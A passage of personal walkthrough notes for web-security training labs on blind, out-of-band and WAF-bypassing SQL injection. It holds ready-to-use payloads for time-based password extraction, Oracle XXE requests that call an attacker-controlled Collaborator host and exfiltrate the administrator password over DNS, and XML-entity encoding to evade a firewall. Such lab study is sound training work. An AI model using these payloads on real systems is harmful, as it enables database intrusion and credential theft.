- **Blind (Time):** The database does **nothing**. It won't show data, won't change the page content, and won't show errors. It is completely silent.

**The Solution:** We force the database to **pause** (sleep) before replying.

- **Our Command:** "If you exist, wait 10 seconds, then load the page."
- **Result:** If the page takes 10+ seconds to load, we know our SQL injection worked.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** to accurately see how long the request takes.

### **Step 1: Identify the Database**

Different databases use different commands to sleep:

- **MySQL:** `SLEEP(10)`
- **Microsoft:** `WAITFOR DELAY '0:0:10'`
- **Oracle:** `dbms_pipe.receive_message(('a'),10)`
- **PostgreSQL:** `pg_sleep(10)`

Since the lab solution uses `pg_sleep`, we know this lab is running on **PostgreSQL**.

### **Step 2: Construct the Payload**

We need to append the sleep command to the existing cookie value. We use concatenation (`||`) to make sure the syntax is valid.

- **Logic:** `(Existing Cookie String)` **OR** `(Sleep for 10 seconds)`
- **Payload:**SQL
    
    `x'||pg_sleep(10)--`
    

### **Step 3: Inject and Verify**

1. Open Burp Suite and intercept the request to the home page.
2. Send it to **Repeater**.
3. Replace the `TrackingId` value with the payload:
`TrackingId=x'||pg_sleep(10)--`
4. **Send the Request.**
5. **Observe:** Look at the bottom right corner of the Repeater window (or the "Response received" timer).
    - **Normal request:** Takes ~209ms.
    
    ![image.png](image%2028.png)
    
    - **Injected request:** Will take **10,000ms+ (10 seconds)**.
    
    ![image.png](image%2029.png)
    

### **Step 4: Completion**

Once the server waits 10 seconds and then responds, the lab detects that the sleep command executed successfully and marks the lab as **Solved**.

---

# LAB 15 : **Blind SQL injection with time delays and information retrieval**

### **The Core Concept**

- **The Problem:** The database is completely silent. No text on the screen, no error messages, nothing.
- **The Solution:** We force the database to wait (sleep) for 10 seconds if our guess is correct.
- **The Logic:** "Is the first letter of the password 'a'? If **YES**, sleep for 10 seconds. If **NO**, reply immediately."

You will need **Burp Suite** for this.

---

### **Step-by-Step Walkthrough**

### **Step 1: Confirm the Database and Logic**

First, we need to prove we can execute a conditional sleep command using PostgreSQL syntax.

1. **Intercept the Request:**
    - Open the lab.
    - In Burp Suite, capture the request to the home page and send it to **Repeater**.
2. **Test the "True" Condition (Should Sleep):**
    - Replace the `TrackingId` cookie value with this payload.
    - **Note:** `%3B` is the URL-encoded version of a semicolon `;`, which allows us to run a second, separate query.
    - **Payload:**SQL
        
        `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
        
    - **Send:** The request should take **10 seconds** (10,000ms) to complete.
3. **Test the "False" Condition (Should NOT Sleep):**
    - Change `(1=1)` to `(1=2)`.
    - **Payload:**SQL
        
        `TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
        
    - **Send:** The request should finish **immediately** (approx 100-200ms).

*Conclusion:* We now have a way to ask True/False questions.

### **Step 2: Determine Password Length**

We ask: *"Is the password length greater than X?"*

1. **Payload:**SQL
    
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
    
2. **Send:**
    - If it sleeps for 10 seconds, the length is > 19.
3. **Refine:**
    - Change `>19` to `>20`.
    - If it replies immediately, the length is **exactly 20**.

### **Step 3: Setup the Attack (Burp Intruder)**

Now we check every character position (1-20) against every possible letter (a-z, 0-9).

1. **Send to Intruder:** Right-click your working request in Repeater and select **Send to Intruder**.
2. **Set the Payload Position:**
    - Go to the **Positions** tab.
    - Replace the cookie with the character-guessing payload:SQL
        
        `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
        
    - Ensure only the letter `'a'` is highlighted with the `§` markers.
3. **Set the Payloads:**
    - Go to the **Payloads** tab.
    - Select **Simple list**.
    - Add letters `a-z` and numbers `0-9`.

### **Step 4: Configure Single-Threaded Attack (CRITICAL)**

**This is the most important step.** If you send 10 requests at once, and one of them sleeps for 10 seconds, Burp won't know *which* request caused the delay because they are all happening at the same time. You must send them one by one.

1. Go to the **Resource Pool** tab (in newer Burp versions) or the **Options** tab (in older versions).
2. Select **Create new resource pool**.
3. Set **Maximum concurrent requests** to **1**.

### **Step 5: Launch and Analyze**

1. Click **Start Attack**.
2. **Customize Columns:**
    - In the results window, go to the **Columns** menu.
    - Check the box for **"Response received"** (or "Time").
3. **Find the Winner:**
    - Look at the "Response received" column.
    - Most rows will be small numbers (e.g., 150, 200).
    - **One row** will be huge (e.g., **10,000** or **10,150**).
    - The payload (letter) for that row is the correct character.

### **Step 6: Repeat for all 20 Characters**

1. Change the `SUBSTRING` offset to `2` (`SUBSTRING(password,2,1)`).
2. Run the attack again to find the 2nd letter.
3. Repeat until you have the full string.
4. **Login:** Use the password to log in as `administrator`.

check your password = ‘xex1qszxth7cc4v5kbhc’

# LAB 16:  **Blind SQL injection with out-of-band interaction**

### **The Core Concept**

This is a step up from the "Time-based" attacks.

- **The Problem:** The database runs your query **asynchronously**. This means the website says "Okay, I received your request" and replies immediately, while the database processes the query in the background.
    - *Visible SQLi:* No (No data on screen).
    - *Boolean SQLi:* No (Page looks the same).
    - *Time-based SQLi:* **No** (Because the web server replies instantly, even if the database sleeps for 10 years).
- **The Solution:**  We inject a command that forces the database to visit a website we control. If our server gets a visitor, we know the injection worked. This technique is called **OAST** (Out-of-band Application Security Testing).

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite Professional** for this lab because it requires **Burp Collaborator**. (Collaborator is the "server" that listens for the database's signal).

### **Step 1: Set up Burp Collaborator**

1. In Burp Suite, go to the **Collaborator** tab.
2. Click **"Copy to clipboard"**.
    - This copies a unique domain address just for you (e.g., `u8x...burpcollaborator.net`).
    - *Think of this as your "listening station".*

### **Step 2: Construct the Payload (Oracle XXE)**

The lab description hints that this is likely an Oracle database (or uses XML functions). A common way to force Oracle to make a network request is using XML parsing vulnerabilities (XXE) inside SQL.

We will tell the database: *"Hey, parse this XML file. and by the way, part of the XML file is hosted at this URL..."*

**The Template Payload:**

SQL

`x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://YOUR-COLLABORATOR-ID/">+%25remote%3b]>'),'/l')+FROM+dual--`

### **Step 3: Inject the Attack**

1. Open the lab and intercept the request to the home page.
2. Send it to **Repeater**.
3. Modify the `TrackingId` cookie:
    - Paste the template payload above.
    - **Crucial:** Replace `YOUR-COLLABORATOR-ID` with the address you copied in Step 1.
    - Ensure the URL starts with `http://`.
4. **Send the Request.**
    - *Result:* The application will respond normally (probably HTTP 200). It won't show any error or weird delay. This is normal.

### **Step 4: Check for Success**

1. Go back to the **Collaborator** tab in Burp.
2. Click **"Poll now"**.
3. **Look at the list:**
    - You should see a **DNS** interaction (and possibly HTTP).
    - This means the Oracle database saw your injected code, parsed the XML, and tried to visit your Collaborator URL to fetch the "entity".
4. Once the interaction appears, the lab is automatically marked as **Solved**.

# LAB 17 : Out of band interaction with data exfiltration

### **The Core Concept**

This is one of the most powerful SQL injection techniques.

- **The Problem:** The database is blind and asynchronous. It won't talk to you directly.
- **The Solution:** We force the database to visit our server (Burp Collaborator), but with a twist. We tell the database: *"Before you visit my server, look up the Administrator's password and write it in the URL."*

**The Exfiltration Mechanism:**
We force a DNS lookup for a domain like:`[SECRET_PASSWORD].your-collaborator-id.burpcollaborator.net`

When the database looks up this domain, your Collaborator log will show the request, and **the password will be right there in the subdomain.**

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite Professional** for this lab.

### **Step 1: Set up Burp Collaborator**

1. In Burp Suite, go to the **Collaborator** tab.
2. Click **"Copy to clipboard"**.
    - Let's assume your ID is: `u8x...burpcollaborator.net`

### **Step 2: Construct the Exfiltration Payload**

We are using the same Oracle XML trick as the last lab, but we are modifying the URL.

- **Old URL:** `http://YOUR-ID`
- **New URL:** `http://` + `(SELECT password FROM users ...)` + `.YOUR-ID`

**The Logic:**
We concatenate (`||`) the password into the domain name.

**The Full Payload :**

- Replace `YOUR_COLLABORATOR_ID` with the address you copied in Step 1.
- *Note: This payload uses URL encoding (`%3d` for `=`, `%25` for `%`) because it is inside an XML string.*

SQL

`x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR_COLLABORATOR_ID/">+%25remote%3b]>'),'/l')+FROM+dual--`

### **Step 3: Inject the Attack**

1. Intercept the home page request in Burp and send it to **Repeater**.
2. Paste the payload into the `TrackingId` cookie.
    - **Double Check:** Did you replace `YOUR_COLLABORATOR_ID` with your actual Collaborator address?
3. **Send the Request.**
    - The application response will likely be normal (HTTP 200). Ignore it.

### **Step 4: Retrieve the Password**

1. Go to the **Collaborator** tab.
2. Click **"Poll now"**.
3. Look for a **DNS** interaction.
4. **Read the Description:**
    - You will see a DNS query that looks like this:`s3cr3tp4ssw0rd.u8x...burpcollaborator.net`
    - The text **before** the first dot is the password!

### **Step 5: Login and Solve**

1. Copy that password string.
2. Go to the browser, click **"My account"**.
3. Log in as `administrator`.

# LAB 18 :**SQL injection with filter bypass via XML encoding**

### **The Core Concept**

This lab introduces a defense mechanism: a **Web Application Firewall (WAF)**.

- **The Problem:** You try to send a standard attack like `UNION SELECT`, but the WAF sees those dangerous words and blocks your request immediately (usually "Attack Detected" or "403 Forbidden").
- **The Loophole:** The website accepts data in **XML format**.
- **The Solution:** We can use **XML Encoding**.
    - The WAF sees this: `&#85;&#78;&#73;&#79;&#78;` (safe-looking gibberish).
    - The XML parser reads it and translates it back to: `UNION` (dangerous SQL).
    - The database then runs the dangerous SQL.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** for this. The "Hackvertor" extension is recommended by the lab, but I will show you how to do it without it (or with a simple tool) so you understand the underlying concept.

### **Step 1: Analyze the Request**

1. Open the lab and go to a product page.
2. Click the **"Check stock"** button.
3. Intercept this request in Burp Suite and send it to **Repeater**.
4. **Look at the body:** It is sending data in XML format.XML
    
    `<stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>`
    

### **Step 2: Confirm the WAF Block**

Try a standard SQL injection to see the firewall in action.

1. Change the `storeId` to:
`1 UNION SELECT NULL`
2. **Send.**
    - *Result:* You will likely see "Attack Detected". The WAF caught you.
    - 
    
    ![image.png](image%2030.png)
    

### **Step 3: Obfuscate the Payload (The Bypass)**

We need to turn our SQL commands into XML entities. You can use an online "HTML/XML Entity Encoder" or Burp's **Hackvertor** extension.

**The Payload:** `1 UNION SELECT NULL`

**Encoding Logic:**

- `U` becomes `&#x55;`
- `N` becomes `&#x4e;`
- `I` becomes `&#x49;`
- ...and so on.

**The Encoded Payload :**

XML

`1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;`

**Injecting it:**

1. Replace the `storeId` value with the encoded string above.XML
    
    `<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;...</storeId>`
    
2. **Send.**
    - *Result:* The page should load normally (no "Attack Detected"). This proves we bypassed the firewall!

### **Step 4: Determine Column Count**

Since the query in Step 3 worked without crashing, we suspect there is **1 column**.
(If you want to be sure, you could try `UNION SELECT NULL, NULL`, encode it, and see if it fails).

### **Step 5: Extract the Password**

Now we construct the final attack to steal the admin credentials.

- **Goal:** `1 UNION SELECT username || '~' || password FROM users`
- **Why `||`?** Because we only have 1 column, so we must mash the username and password together.

**Encoding the Attack:**
We need to encode the `UNION SELECT...` part.

- *Plaintext:* `1 UNION SELECT username || '~' || password FROM users`
- *Encoded:*Plaintext
    
    `1&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;`
    

**Injecting it:**

1. Paste the long encoded string into the `<storeId>` tag.
2. **Send.**
3. **Result:** Look at the response body. You should see the stock levels replaced with usernames and passwords, like:`administrator~s3cr3t...`
4. 

![image.png](image%2031.png)

### **Step 6: Login and Solve**

1. Copy the administrator's password (the text after the `~`).
2. Go to the browser, click **"My account"**.
3. Log in as `administrator`.
